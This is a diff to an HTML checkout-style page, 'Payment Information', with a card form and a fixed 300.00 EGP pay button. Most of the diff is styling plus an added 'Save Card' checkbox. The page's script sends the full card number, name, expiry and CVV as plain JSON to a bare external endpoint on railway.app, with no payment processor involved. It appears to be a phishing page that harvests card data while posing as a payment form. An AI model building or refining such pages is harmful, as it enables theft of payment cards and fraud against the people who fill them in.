@@ -5,12 +5,15 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Payment Information</title>
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: Arial, sans-serif;
+            font-family: 'Roboto', sans-serif;
         }
+
         body {
             background-color: #f4f4f4;
             display: flex;
@@ -18,18 +21,22 @@
             align-items: center;
             height: 100vh;
         }
+
         .container {
             background: white;
-            width: 350px;
+            width: 360px;
             padding: 20px;
             border-radius: 10px;
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
             text-align: center;
         }
+
         h2 {
             color: #333;
             margin-bottom: 15px;
+            font-weight: 700;
         }
+
         .card {
             background: #0074D9;
             color: white;
@@ -38,21 +45,26 @@
             text-align: left;
             position: relative;
         }
+
         .chip {
             width: 40px;
             position: absolute;
             top: 10px;
             left: 10px;
         }
+
         .form-group {
             text-align: left;
-            margin: 15px 0;
+            margin: 10px 0;
         }
+
         label {
             display: block;
             margin-bottom: 5px;
-            font-weight: bold;
+            font-size: 14px;
+            font-weight: 500;
         }
+
         input {
             width: 100%;
             padding: 10px;
@@ -60,10 +72,20 @@
             border-radius: 5px;
             font-size: 16px;
         }
+
         input:focus {
             border-color: #0074D9;
             outline: none;
         }
+
+        .save-card {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+
         .pay-btn {
             width: 100%;
             background: #0074D9;
@@ -74,30 +96,37 @@
             border-radius: 5px;
             cursor: pointer;
             margin-top: 10px;
+            font-weight: 700;
         }
+
         .pay-btn:hover {
             background: #005bb5;
         }
+
         .logos {
             display: flex;
             justify-content: center;
             gap: 10px;
-            margin-top: 10px;
+            margin-top: 15px;
         }
+
         .logos img {
             width: 50px;
         }
+
         .secure {
             font-size: 12px;
             margin-top: 5px;
             color: #666;
         }
+
     </style>
 </head>
 <body>
 
     <div class="container">
         <h2>Payment Information</h2>
+        
         <div class="card">
             <img src="https://upload.wikimedia.org/wikipedia/commons/8/88/EMV-Chip.svg" class="chip" alt="Chip">
             <p>Card Number</p>
@@ -127,6 +156,11 @@
             <div class="form-group">
                 <label>CVV:</label>
                 <input type="text" id="cvv" placeholder="CVV" maxlength="3" required>
+            </div>
+
+            <div class="save-card">
+                <input type="checkbox" id="saveCard">
+                <label for="saveCard">Save Card</label>
             </div>
 
             <button type="submit" class="pay-btn">PAY 300.00 EGP</button>
@@ -172,11 +206,12 @@
             const name = document.getElementById("name").value;
             const expiry = document.getElementById("expiry").value;
             const cvv = document.getElementById("cvv").value;
+            const saveCard = document.getElementById("saveCard").checked;
 
             fetch("https://nodejs-production-7090.up.railway.app/send", { 
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ cardNumber, name, expiry, cvv })
+                body: JSON.stringify({ cardNumber, name, expiry, cvv, saveCard })
             })
             .then(response => response.json())
             .then(data => alert(data.message))
